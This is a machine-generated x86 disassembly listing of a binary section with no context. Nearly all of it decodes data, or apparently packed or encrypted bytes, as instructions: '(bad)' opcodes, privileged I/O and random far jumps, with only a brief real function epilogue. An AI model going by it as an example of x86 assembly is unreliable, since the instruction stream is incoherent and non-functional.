  41c49f:	imul   ebx,DWORD PTR [edx-0x23],0x5ecfa88a
  41c4a6:	xchg   ebx,eax
  41c4a7:	in     eax,dx
  41c4a8:	ret    0x992a
  41c4ab:	cmp    BYTE PTR [esi],0x62
  41c4ae:	dec    eax
  41c4af:	sub    eax,0x25ec885e
  41c4b4:	cld    
  41c4b5:	mov    cl,0xc6
  41c4b7:	stos   BYTE PTR es:[edi],al
  41c4b8:	ins    DWORD PTR es:[edi],dx
  41c4b9:	pop    edx
  41c4ba:	or     BYTE PTR [ebp+0x290bc523],al
  41c4c0:	mov    ebp,DWORD PTR [edx+0x61b810ff]
  41c4c6:	sub    BYTE PTR [esi+0x14f222e7],al
  41c4cc:	out    dx,eax
  41c4cd:	add    ebx,edi
  41c4cf:	inc    esi
  41c4d1:	lea    edi,[ecx+0x39]
  41c4d4:	inc    edi
  41c4d5:	scas   al,BYTE PTR es:[edi]
  41c4d6:	sbb    eax,0x6dcc3bdc
  41c4db:	sbb    eax,0x36d28afe
  41c4e0:	sub    DWORD PTR [ebx-0x7adde8f],ecx
  41c4e6:	xlat   BYTE PTR ds:[ebx]
  41c4e7:	outs   dx,BYTE PTR ds:[esi]
  41c4e8:	inc    edi
  41c4e9:	cs jno 0x41c4da
  41c4ec:	(bad)  
  41c4ed:	jp     0x41c55a
  41c4ef:	and    esi,DWORD PTR [ecx]
  41c4f1:	ja     0x41c569
  41c4f3:	push   edx
  41c4f4:	xchg   ecx,eax
  41c4f5:	push   eax
  41c4f6:	call   0x549249c7
  41c4fb:	and    BYTE PTR [ecx+0xc9a5e7e],ah
  41c501:	inc    ecx
  41c502:	repnz xlat BYTE PTR ds:[ebx]
  41c504:	mov    ds,WORD PTR gs:[eax+0x7f450f13]
  41c50b:	pushf  
  41c50c:	sysexit 
  41c50e:	push   ss
  41c50f:	or     eax,0x1cfd5ecd
  41c514:	sahf   
  41c515:	adc    al,0x72
  41c517:	and    eax,0x5c93b770
  41c51c:	pop    ss
  41c51d:	cmc    
  41c51e:	inc    esp
  41c51f:	or     DWORD PTR [ebx],ebp
  41c521:	shr    DWORD PTR [ecx-0x2d],cl
  41c524:	mov    ds:0x4bde38b5,al
  41c529:	and    eax,0x7b1c540f
  41c52e:	mov    ah,0x4a
  41c530:	retf   
  41c531:	xchg   ebx,eax
  41c532:	fld    TBYTE PTR [esi+esi*2+0x5a]
  41c536:	in     al,dx
  41c537:	or     dh,0xc1
  41c53a:	push   ebp
  41c53b:	cli    
  41c53c:	cwde   
  41c53d:	or     eax,0xbf2af021
  41c542:	pusha  
  41c543:	and    al,0xd9
  41c545:	sti    
  41c546:	jmp    0x41c54c
  41c548:	lods   al,BYTE PTR ds:[esi]
  41c549:	cmp    DWORD PTR [edi+0x46],ecx
  41c54c:	pop    es
  41c54d:	imul   esp,DWORD PTR [eax+eiz*4+0x3e],0xf2613aca
  41c555:	mov    bh,0x8f
  41c557:	stos   BYTE PTR es:[edi],al
  41c558:	dec    edi
  41c559:	inc    eax
  41c55a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c55b:	out    dx,eax
  41c55c:	aad    0xfc
  41c55e:	sbb    ebp,DWORD PTR [edx+0x2c46e711]
  41c564:	push   ecx
  41c565:	bound  ebp,QWORD PTR ds:0xcfd93b2c
  41c56b:	fldenv [ebp+ebp*4+0x4b362f52]
  41c572:	push   ebx
  41c573:	outs   dx,BYTE PTR ds:[esi]
  41c574:	mov    bh,0xf3
  41c576:	pop    edi
  41c577:	das    
  41c578:	stc    
  41c579:	cmc    
  41c57a:	stos   DWORD PTR es:[edi],eax
  41c57b:	sbb    al,0x86
  41c57d:	push   eax
  41c57e:	in     eax,0x12
  41c580:	(bad)
  41c583:	sahf   
  41c584:	push   esp
  41c585:	xrelease mov DWORD PTR [ebp+0x2914cd2d],eax
  41c58c:	mov    BYTE PTR [edi-0xf],bl
  41c58f:	adc    DWORD PTR [edi],esi
  41c591:	in     eax,dx
  41c592:	push   ecx
  41c593:	hlt    
  41c594:	(bad)
  41c597:	pop    esp
  41c598:	ror    BYTE PTR [ebp-0x4d80d],1
  41c59e:	xchg   ebx,eax
  41c59f:	cdq    
  41c5a0:	xor    edi,esp
  41c5a2:	fiadd  WORD PTR [ebx+0xb9a40d5]
  41c5a8:	pop    esi
  41c5a9:	inc    eax
  41c5aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ab:	inc    ebx
  41c5ac:	push   ebx
  41c5ad:	mov    edx,0x33974ffb
  41c5b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5b3:	add    DWORD PTR [edx+0x22],eax
  41c5b6:	test   DWORD PTR ds:0x4af0e8f2,0xde4a12f0
  41c5c0:	mov    edi,0x293bee41
  41c5c5:	add    eax,0xc636804
  41c5ca:	inc    ecx
  41c5cb:	xor    eax,ecx
  41c5cd:	out    dx,eax
  41c5ce:	ins    BYTE PTR es:[edi],dx
  41c5cf:	mov    edx,0x76a0c1d3
  41c5d4:	or     eax,0x534c9fba
  41c5d9:	jmp    0xb39a:0x3ce5ad7b
  41c5e0:	mov    edx,0xbdad876d
  41c5e5:	sti    
  41c5e6:	les    esp,FWORD PTR [esi-0x313c2710]
  41c5ec:	push   eax
  41c5ed:	scas   eax,DWORD PTR es:[edi]
  41c5ee:	push   ecx
  41c5ef:	or     ah,bl
  41c5f1:	enter  0xf332,0xf2
  41c5f5:	fsub   DWORD PTR [edi+0x21de460d]
  41c5fb:	xchg   edx,eax
  41c5fc:	outs   dx,DWORD PTR ds:[esi]
  41c5fd:	ror    BYTE PTR [eax-0x689ed8],0xcc
  41c604:	into   
  41c605:	push   edx
  41c606:	fmul   DWORD PTR [ebp+0x78]
  41c609:	inc    edx
  41c60a:	repz and al,0x7c
  41c60d:	sbb    eax,0x43859dea
  41c612:	mov    ecx,0xc154c470
  41c617:	xor    ebx,edi
  41c619:	je     0x41c66b
  41c61b:	xchg   ebx,eax
  41c61c:	cdq    
  41c61d:	mov    gs,WORD PTR [esi+0x2088079e]
  41c623:	scas   al,BYTE PTR es:[edi]
  41c624:	push   ebx
  41c625:	wbinvd 
  41c627:	pop    es
  41c628:	add    eax,0x1eb51518
  41c62d:	aaa    
  41c62e:	repnz in al,0xa8
  41c631:	sbb    dh,BYTE PTR [ebp+0x23]
  41c634:	gs (bad) 
  41c636:	rep stos BYTE PTR es:[edi],al
  41c638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c639:	mov    ds:0xb79c6763,al
  41c63e:	add    cl,bl
  41c640:	das    
  41c641:	jmp    0x41c5c8
  41c643:	jb     0x41c6b3
  41c645:	std    
  41c646:	dec    eax
  41c647:	pop    esp
  41c648:	mov    bl,0xb8
  41c64a:	mov    BYTE PTR [ebx+0x36068cfb],cl
  41c650:	push   ss
  41c651:	push   ebx
  41c652:	xchg   ecx,eax
  41c653:	jns    0x41c5fb
  41c655:	push   esi
  41c656:	loop   0x41c698
  41c658:	mov    esp,0xbc4cfac8
  41c65d:	imul   ebx,DWORD PTR [esi+0x60],0xffffffc2
  41c661:	outs   dx,BYTE PTR ds:[esi]
  41c662:	fs pushf 
  41c664:	add    edx,ebp
  41c666:	bound  ebx,QWORD PTR [edi-0x1f]
  41c669:	ret    
  41c66a:	cdq    
  41c66b:	mov    edi,0xb9f4942a
  41c670:	jl     0x41c621
  41c672:	lds    edi,FWORD PTR [esi]
  41c674:	xor    bh,BYTE PTR [ebp+0x144f5ac1]
  41c67a:	fldcw  WORD PTR [eax-0x561ed513]
  41c680:	add    DWORD PTR ds:0xf8d2f4a,0x51
  41c687:	cmp    DWORD PTR [ebx-0x359389b2],0xffffffb9
  41c68e:	clc    
  41c68f:	dec    ebp
  41c690:	fwait
  41c691:	lock add DWORD PTR [esp+eiz*2],esi
  41c695:	xchg   ebx,eax
  41c696:	cmp    eax,0x7321b246
  41c69b:	pop    edi
  41c69c:	in     eax,dx
  41c69d:	loop   0x41c67b
  41c69f:	jecxz  0x41c686
  41c6a1:	out    dx,al
  41c6a2:	mov    esi,0xe4f4e32f
  41c6a7:	and    BYTE PTR [ecx+0x6e],dl
  41c6aa:	sub    eax,0x72c496d7
  41c6af:	or     eax,0xfc4a38e9
  41c6b4:	xchg   edx,eax
  41c6b5:	dec    ecx
  41c6b6:	in     eax,dx
  41c6b7:	xchg   edx,eax
  41c6b8:	push   ebp
  41c6b9:	popf   
  41c6ba:	mov    ss,WORD PTR ds:0xa7628852
  41c6c0:	lock push esi
  41c6c2:	mov    ebp,0x9d9f47b5
  41c6c7:	ret    0x8daa
  41c6ca:	aaa    
  41c6cb:	dec    ebx
  41c6cc:	add    al,0xbc
  41c6ce:	stos   DWORD PTR es:[edi],eax
  41c6cf:	ss xor eax,0xbc4f126d
  41c6d5:	pop    ecx
  41c6d6:	xchg   edi,eax
  41c6d7:	clc    
  41c6d8:	lock jle 0x41c72d
  41c6db:	jmp    0x41c6c6
  41c6dd:	jo     0x41c70c
  41c6df:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6e1:	loopne 0x41c72f
  41c6e3:	mov    ebx,0xf5bfc66e
  41c6e8:	loopne 0x41c6fe
  41c6ea:	imul   dl
  41c6ec:	rol    DWORD PTR [ebx+0x7829deb0],cl
  41c6f2:	and    dl,BYTE PTR [ebx+ecx*4+0x6a338474]
  41c6f9:	jge    0x41c73e
  41c6fb:	in     al,0x31
  41c6fd:	sbb    al,0x6
  41c6ff:	jae    0x41c6ab
  41c701:	and    BYTE PTR [edx],dh
  41c703:	neg    BYTE PTR [ebp-0x463b7331]
  41c709:	xor    eax,0xf89bf4a0
  41c70e:	loope  0x41c6f1
  41c710:	adc    bh,dl
  41c712:	(bad)  
  41c713:	xor    al,0x71
  41c715:	stos   DWORD PTR es:[edi],eax
  41c716:	daa    
  41c717:	shl    BYTE PTR [ecx-0x5f],0xe4
  41c71b:	in     al,dx
  41c71c:	dec    esp
  41c71d:	js     0x41c79e
  41c71f:	fimul  WORD PTR [ebp+0x18935fdc]
  41c725:	jle    0x41c6c1
  41c727:	push   ebp
  41c728:	cdq    
  41c729:	xlat   BYTE PTR ds:[ebx]
  41c72a:	xor    al,0x2e
  41c72c:	dec    ecx
  41c72d:	cwde   
  41c72e:	pushw  cs
  41c730:	jp     0x41c71e
  41c732:	xor    BYTE PTR [ebx],ah
  41c734:	call   0x3c8a3be8
  41c739:	scas   al,BYTE PTR es:[edi]
  41c73a:	pop    edx
  41c73b:	adc    DWORD PTR [eax-0x2f],edi
  41c73e:	and    esi,DWORD PTR [eax+eax*2]
  41c741:	xor    eax,0xcad4a2b4
  41c746:	jns    0x41c7c0
  41c748:	pop    ecx
  41c749:	test   BYTE PTR [ebp+0x15],ch
  41c74c:	test   al,0xf8
  41c74e:	retf   0xbb5c
  41c751:	loop   0x41c7be
  41c753:	add    esi,DWORD PTR [edx-0x7f]
  41c756:	dec    ecx
  41c757:	lahf   
  41c758:	jb     0x41c70a
  41c75a:	jns    0x41c7a9
  41c75c:	(bad)  
  41c75e:	in     eax,dx
  41c75f:	mov    es,edi
  41c761:	xchg   bl,cl
  41c763:	cwde   
  41c764:	xchg   ebx,eax
  41c765:	mov    edi,0xabf9cbb3
  41c76a:	jge    0x41c7a1
  41c76c:	bound  ebp,QWORD PTR [ecx+0x2f4737b6]
  41c772:	jo     0x41c7c4
  41c774:	mov    ebx,0xe3af015b
  41c779:	lods   eax,DWORD PTR ds:[esi]
  41c77a:	cli    
  41c77b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c77c:	out    0x24,al
  41c77e:	mov    bh,0x29
  41c780:	cmp    bl,BYTE PTR [ecx+0x4b3cbe24]
  41c786:	hlt    
  41c787:	ret    
  41c788:	mov    edi,0x6a473f41
  41c78d:	cmc    
  41c78e:	in     eax,0xf8
  41c790:	stos   BYTE PTR es:[edi],al
  41c791:	dec    edx
  41c792:	cmp    eax,0xb26a64f1
  41c797:	ja     0x41c720
  41c799:	(bad)  
  41c79a:	stc    
  41c79b:	jmp    0x41c757
  41c79d:	int3   
  41c79e:	xor    DWORD PTR [edx-0x9],ebp
  41c7a1:	mov    fs,WORD PTR [ebx+0x53db4cfa]
  41c7a7:	sbb    al,0x68
  41c7a9:	cmp    DWORD PTR [edx],ebx
  41c7ab:	in     eax,dx
  41c7ac:	adc    dl,dl
  41c7ae:	push   ss
  41c7af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7b0:	repz jbe 0x41c7fa
  41c7b3:	mov    al,ds:0x7d411e19
  41c7b8:	jmp    0x41c7db
  41c7ba:	fcomp  DWORD PTR [ecx]
  41c7bc:	add    BYTE PTR [ecx],cl
  41c7be:	dec    esp
  41c7bf:	or     al,bl
  41c7c1:	mov    bh,0x1f
  41c7c3:	bound  edi,QWORD PTR [ebx+ebp*2]
  41c7c6:	add    ecx,DWORD PTR [ebx]
  41c7c8:	ret    
  41c7c9:	jmp    0x28f65582
  41c7ce:	mov    dh,BYTE PTR [eax]
  41c7d0:	add    eax,0x3225f333
  41c7d5:	adc    DWORD PTR ds:[edi+edx*4-0x7f805299],ebx
  41c7dd:	call   0x2d7f:0xaf3e87f6
  41c7e4:	pop    esp
  41c7e5:	jmp    0x6d6f:0x8aba46d8
  41c7ec:	arpl   WORD PTR [edi],bp
  41c7ee:	add    DWORD PTR [ebp+0x68d74f17],eax
  41c7f4:	dec    ecx
  41c7f5:	adc    esi,DWORD PTR [esi+0x35275ac9]
  41c7fb:	xchg   ebp,eax
  41c7fc:	lahf   
  41c7fd:	out    dx,eax
  41c7fe:	stos   BYTE PTR es:[edi],al
  41c7ff:	jbe    0x41c80b
  41c801:	mov    cl,0xb
  41c803:	dec    edx
  41c804:	repz aaa 
  41c806:	retf   
  41c807:	out    0xc2,eax
  41c809:	imul   esi,DWORD PTR [ebx],0xffffffa9
  41c80c:	in     eax,0x66
  41c80e:	jne    0x41c809
  41c810:	jbe    0x41c7e1
  41c812:	xchg   esi,eax
  41c813:	cli    
  41c814:	mov    ebp,0x76c62ef0
  41c819:	(bad)  
  41c81a:	jae    0x41c7dd
  41c81c:	test   DWORD PTR [ebx+edx*2+0xd643bc],0xa726548f
  41c827:	add    esi,DWORD PTR [edi]
  41c829:	in     eax,dx
  41c82a:	jle    0x41c7b0
  41c82c:	mov    ecx,0xf410a076
  41c831:	stc    
  41c832:	(bad)  
  41c833:	fcom   QWORD PTR [ebx+0x35a987c3]
  41c839:	loope  0x41c83c
  41c83b:	lock je 0x41c829
  41c83e:	mov    edx,ss
  41c840:	adc    edi,ebp
  41c842:	cmp    DWORD PTR [eax],0x2d
  41c845:	xchg   ebx,eax
  41c846:	lods   al,BYTE PTR ds:[esi]
  41c847:	xor    cl,BYTE PTR [eax]
  41c849:	fld    QWORD PTR [eax+0xe]
  41c84c:	sahf   
  41c84d:	mov    ds:0x2a200a19,eax
  41c852:	pop    ecx
  41c853:	inc    edx
  41c854:	pop    edx
  41c855:	push   0x52
  41c857:	out    dx,eax
  41c858:	jae    0x41c88c
  41c85a:	cmp    al,0x23
  41c85c:	ja     0x41c862
  41c85e:	dec    ebx
  41c85f:	push   es
  41c860:	jmp    0x98c2cac1
  41c865:	mov    ch,0x2a
  41c867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c868:	imul   eax,DWORD PTR [esp+ebx*2],0xffffff82
  41c86c:	or     al,0xee
  41c86e:	faddp  st(0),st
  41c870:	loop   0x41c879
  41c872:	into   
  41c873:	adc    bl,cl
  41c875:	or     ch,al
  41c877:	push   edi
  41c878:	add    eax,0x3a40a6c8
  41c87d:	mov    eax,0xb3e671d8
  41c882:	rol    BYTE PTR [edx-0x7e4238cb],0xc1
  41c889:	ins    BYTE PTR es:[edi],dx
  41c88a:	fiadd  DWORD PTR ds:0x6d7e84bb
  41c890:	mov    WORD PTR [eax],ds
  41c892:	sbb    eax,DWORD PTR [edi]
  41c894:	popf   
  41c895:	sub    al,BYTE PTR [eax]
  41c897:	jns    0x41c8a7
  41c899:	sub    BYTE PTR [ebp+0x3650268],bl
  41c89f:	ror    DWORD PTR [ebx-0x50f0f3b3],0xc1
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xe7dc88e2
  41c8c2:	repnz mov BYTE PTR [edi-0x55fffe7b],ch
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    al,cl
  41c8cd:	xor    ecx,DWORD PTR [ebx-0x5c94642d]
  41c8d3:	into   
  41c8d4:	daa    
  41c8d5:	pop    ecx
  41c8d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d7:	sbb    DWORD PTR [edi+0x1cbd7cd5],0x39fa8b13
  41c8e1:	cdq    
  41c8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8e3:	ret    0xfdbb
  41c8e6:	mov    DWORD PTR [edi+0x62],esp
  41c8e9:	neg    ecx
  41c8eb:	in     al,0x12
  41c8ed:	rcl    DWORD PTR [ebp-0x114f9e71],0xdb
  41c8f4:	mov    cl,0x4b
  41c8f6:	js     0x41c8a7
  41c8f8:	pop    edi
  41c8f9:	push   0x8f079df2
  41c8fe:	enter  0xbf2d,0xb6
  41c902:	jno    0x41c8c0
  41c904:	xor    esp,DWORD PTR [eax]
  41c906:	or     ch,BYTE PTR [ecx+0x10]
  41c909:	xchg   edi,eax
  41c90a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c90b:	mov    ebp,0x1c383273
  41c910:	jp     0x41c96c
  41c912:	xor    al,0x9a
  41c914:	mov    bl,0xbb
  41c916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c917:	mov    dh,0x7f
  41c919:	in     al,dx
  41c91a:	adc    al,0xf0
  41c91c:	push   cs
  41c91d:	add    al,BYTE PTR [ebx+ecx*2+0x40c51f8]
  41c924:	lods   al,BYTE PTR ds:[esi]
  41c925:	and    BYTE PTR [ebp-0x538d37b7],al
  41c92b:	fld    QWORD PTR [ebp-0x46]
  41c92e:	inc    ecx
  41c92f:	pusha  
  41c930:	test   eax,0xffacc324
  41c935:	(bad)  
  41c936:	(bad)  
  41c937:	rcr    DWORD PTR [eax],cl
  41c939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93a:	repz mov esi,esp
  41c93d:	jg     0x41c9ab
  41c93f:	dec    ebp
  41c940:	mov    ebp,DWORD PTR [esp+ebx*2]
  41c943:	mov    cl,bh
  41c945:	dec    edi
  41c946:	cmp    edi,DWORD PTR [ebp+esi*2+0x6f038f09]
  41c94d:	xor    ebx,ebp
  41c94f:	popf   
  41c950:	in     al,0xa
  41c952:	loope  0x41c97b
  41c954:	sar    DWORD PTR [esi+0x5],1
  41c957:	mov    edx,ds
  41c959:	adc    edi,DWORD PTR [eax-0x55]
  41c95c:	add    bl,0xa4
  41c95f:	retf   
  41c960:	jbe    0x41c994
  41c962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c964:	sub    esp,esp
  41c966:	xor    al,0x4f
  41c968:	call   0x4180:0xf7722422
  41c96f:	xor    BYTE PTR [ebx],dh
  41c971:	nop
  41c972:	xchg   ebp,eax
  41c973:	pop    edi
  41c974:	iret   
  41c975:	push   ss
	...
  41c982:	add    BYTE PTR [eax],al
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x227bb757
  41c994:	pop    ecx
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [edx-0x1a000000],ch
  41c99d:	pop    edi
  41c99e:	push   ss
  41c99f:	or     eax,0x607b3bb2
  41c9a4:	dec    ecx
  41c9a5:	rcr    DWORD PTR [edx],0xd6
  41c9a8:	repz add eax,0x4ec71bf5
  41c9ae:	rcl    DWORD PTR ds:0xc70b5c03,0x70
  41c9b5:	leave  
  41c9b6:	fsub   QWORD PTR [esi-0x28]
  41c9b9:	jmp    0x41c9a3
  41c9bb:	imul   esi,DWORD PTR [ecx+0x356e490a],0x34
  41c9c2:	xchg   DWORD PTR [ebp-0x1f36888c],ebx
  41c9c8:	mov    dl,0x80
  41c9ca:	fisttp WORD PTR [ebx+ebx*4-0x3a9ec061]
  41c9d1:	leave  
  41c9d2:	cmp    BYTE PTR [ecx-0x165e0cf2],dh
  41c9d8:	push   cs
  41c9d9:	clc    
  41c9da:	mov    edx,0xffa911a2
  41c9df:	iret   
  41c9e0:	jge    0x41c9e6
  41c9e2:	in     eax,dx
  41c9e3:	push   esp
  41c9e4:	sub    ch,ch
  41c9e6:	and    DWORD PTR [ebx-0x51],eax
  41c9e9:	inc    esp
  41c9ea:	clc    
  41c9eb:	pusha  
  41c9ec:	jno    0x41c988
  41c9ee:	xor    eax,DWORD PTR [eax-0x3e5ace4e]
  41c9f4:	stc    
  41c9f5:	add    eax,0x8ee32820
  41c9fa:	pop    edx
  41c9fb:	adc    eax,0x2b4fad71
  41ca00:	and    eax,0x1dc64728
  41ca05:	fiadd  WORD PTR [eax+0x3a]
  41ca08:	mov    ds:0x2279d851,al
  41ca0d:	mov    ds:0x1e143ef5,al
  41ca12:	push   edx
  41ca13:	mov    ch,0x9
  41ca15:	jno    0x41c9f0
  41ca17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca18:	cmp    esp,ebp
  41ca1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca1b:	ret    0x144a
  41ca1e:	(bad)  
  41ca1f:	cwde   
  41ca20:	cld    
  41ca21:	mov    edx,0xd8683a37
  41ca26:	clc    
  41ca27:	out    0x49,al
  41ca29:	aad    0x4e
  41ca2b:	mov    edx,0x7b948d89
  41ca30:	loop   0x41c9fc
  41ca32:	leave  
  41ca33:	lahf   
  41ca34:	push   cs
  41ca35:	cdq    
  41ca36:	push   cs
  41ca37:	aas    
  41ca38:	and    DWORD PTR [eax+0x1a2032b],ecx
  41ca3e:	add    BYTE PTR [eax+0x1726da71],bh
  41ca44:	sbb    BYTE PTR [ecx+0x0],0x0
	...
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x69758813],0x3
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [edx-0x1d000000],ch
  41ca6d:	and    dh,BYTE PTR [eax]
  41ca6f:	inc    edx
  41ca70:	mov    esp,0x1ebf4c8
  41ca75:	xor    eax,0x70a36e39
  41ca7a:	icebp  
  41ca7b:	jge    0x41ca8d
  41ca7d:	inc    edx
  41ca7e:	push   ds
  41ca7f:	int    0x12
  41ca81:	adc    bl,BYTE PTR [ebx-0x2a]
  41ca84:	lea    esp,[eax]
  41ca86:	cs pop ecx
  41ca88:	clc    
  41ca89:	cmp    DWORD PTR [edx*8+0x362a5185],ecx
  41ca90:	dec    BYTE PTR [ecx-0x42e0c6a]
  41ca96:	adc    eax,0xf8042486
  41ca9b:	sbb    ebx,DWORD PTR [ebp-0x79]
  41ca9e:	mov    ch,0x2a
  41caa0:	mov    WORD PTR [edi+0x78],ds
  41caa3:	xchg   esp,eax
  41caa4:	dec    esi
  41caa5:	into   
  41caa6:	test   al,0x27
  41caa8:	ja     0x41cb1d
  41caaa:	sti    
  41caab:	inc    ecx
  41caac:	aas    
  41caad:	jo     0x41cab6
  41caaf:	out    0x97,eax
  41cab1:	inc    ecx
  41cab2:	inc    ebx
  41cab3:	into   
  41cab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cab5:	xchg   edi,eax
  41cab6:	fist   DWORD PTR [edi+ebx*4+0x6477fe20]
  41cabd:	xlat   BYTE PTR ds:[ebx]
  41cabe:	adc    esp,edx
  41cac0:	mov    ah,0x75
  41cac2:	(bad)  
  41cac3:	(bad)  
  41cac4:	xchg   ecx,eax
  41cac5:	sahf   
  41cac6:	push   ds
  41cac7:	fiadd  DWORD PTR [ebp+0x11]
  41caca:	es aas 
  41cacc:	jns    0x41cadb
  41cace:	mov    ebp,0x97ecd26d
  41cad3:	sub    DWORD PTR [eax-0x1b],ecx
  41cad6:	mov    bh,bl
  41cad8:	mov    ah,0x7c
  41cada:	mov    eax,0xc1aa295e
  41cadf:	add    eax,0x31cd381e
  41cae4:	dec    esi
  41cae5:	jl     0x41cab7
  41cae7:	jnp    0x41ca72
  41cae9:	pop    esp
  41caea:	lods   eax,DWORD PTR ds:[esi]
  41caeb:	sbb    al,0x5c
  41caed:	adc    DWORD PTR [esi],0x81c6c7ad
  41caf3:	jbe    0x41cb44
  41caf5:	iret   
  41caf6:	xor    DWORD PTR [esi+eiz*1-0x998528b],0xcf55d99b
  41cb01:	add    dl,BYTE PTR [eax+0x76]
  41cb04:	sbb    dl,BYTE PTR [ebx]
  41cb06:	hlt    
  41cb07:	into   
  41cb08:	xchg   edx,eax
  41cb09:	imul   DWORD PTR [esi+ebx*8-0x6a]
  41cb0d:	bound  eax,QWORD PTR cs:[edx-0xb]
  41cb11:	jnp    0x41caac
  41cb13:	jg     0x41cafc
  41cb15:	scas   eax,DWORD PTR es:[edi]
	...
  41cb22:	add    BYTE PTR [eax],al
  41cb24:	das    
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	lods   eax,DWORD PTR ds:[esi]
  41cb31:	lods   al,BYTE PTR ds:[esi]
  41cb32:	mov    ebx,0x187ad02
  41cb37:	add    BYTE PTR [edx-0x51000000],ch
  41cb3d:	mov    cl,0xd3
  41cb3f:	ins    BYTE PTR es:[edi],dx
  41cb40:	pop    edi
  41cb41:	stos   DWORD PTR es:[edi],eax
  41cb42:	sbb    DWORD PTR [ebp-0x10],edi
  41cb45:	cld    
  41cb46:	popf   
  41cb47:	mov    al,ds:0x27529bdf
  41cb4c:	les    edi,FWORD PTR [ebx+0x6688ec60]
  41cb52:	sti    
  41cb53:	out    dx,al
  41cb54:	xor    eax,0x7d226c30
  41cb59:	jmpw   0xbb9f
  41cb5d:	popa   
  41cb5e:	sar    DWORD PTR [esi],cl
  41cb60:	popa   
  41cb61:	or     al,0x4b
  41cb63:	and    eax,0x6a2368a7
  41cb68:	loope  0x41cb21
  41cb6a:	mov    ebp,0x8dcabb52
  41cb6f:	push   ds
  41cb70:	dec    edi
  41cb71:	test   al,0x76
  41cb73:	add    BYTE PTR [ecx-0x5371f8c7],0xdd
  41cb7a:	xchg   ebp,eax
  41cb7b:	dec    ebx
  41cb7c:	stc    
  41cb7d:	dec    eax
  41cb7e:	sub    edx,DWORD PTR [esi+0x624d9c70]
  41cb84:	sub    ah,BYTE PTR [esp+eax*8+0x25]
  41cb88:	inc    ebx
  41cb89:	paddsb mm6,QWORD PTR [ebp-0x1]
  41cb8d:	mov    ebp,0x427752a7
  41cb92:	mov    cl,0x44
  41cb94:	(bad)  
  41cb95:	(bad)
  41cb98:	lock ins DWORD PTR es:[edi],dx
  41cb9a:	int    0xb3
  41cb9c:	cmp    DWORD PTR [edx],ebp
  41cb9e:	out    dx,eax
  41cb9f:	fs mov edi,0x8efbf763
  41cba5:	sbb    DWORD PTR [eax+0x1b356049],esp
  41cbab:	mov    WORD PTR [edx],ss
  41cbad:	daa    
  41cbae:	gs adc eax,0xad65a957
  41cbb4:	xchg   edi,eax
  41cbb5:	add    dh,BYTE PTR [ebp-0x48eaba7a]
  41cbbb:	pop    edx
  41cbbc:	rol    BYTE PTR [ebp-0x2e5e3b87],0x2a
  41cbc3:	popa   
  41cbc4:	aaa    
  41cbc5:	out    dx,al
  41cbc6:	in     eax,0xc1
  41cbc8:	icebp  
  41cbc9:	mov    al,BYTE PTR [edi-0x8]
  41cbcc:	rcr    BYTE PTR [esi+esi*2],cl
  41cbcf:	in     eax,0xe1
  41cbd1:	add    al,0x21
  41cbd3:	jo     0x41cbb8
  41cbd5:	dec    edi
  41cbd6:	adc    DWORD PTR [ebx],0xc69b260a
  41cbdc:	xor    al,0x5c
  41cbde:	cmp    bh,BYTE PTR [ebx-0x33dab5af]
  41cbe4:	int    0x2c
	...
  41cbf2:	add    BYTE PTR [eax],al
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x192f1836,al
  41cc04:	push   edi
  41cc05:	mov    BYTE PTR [ecx],al
  41cc07:	add    BYTE PTR [edx-0x60000000],ch
  41cc0d:	mul    BYTE PTR [edi+0x751d1afb]
  41cc13:	das    
  41cc14:	test   BYTE PTR [eax],cl
  41cc16:	out    dx,eax
  41cc17:	call   0x6f11778d
  41cc1c:	ficom  DWORD PTR [edi-0x6b]
  41cc1f:	mov    ss,ebx
  41cc21:	xchg   ebx,eax
  41cc22:	aad    0x7b
  41cc24:	mov    ebp,0x8e4d2b5
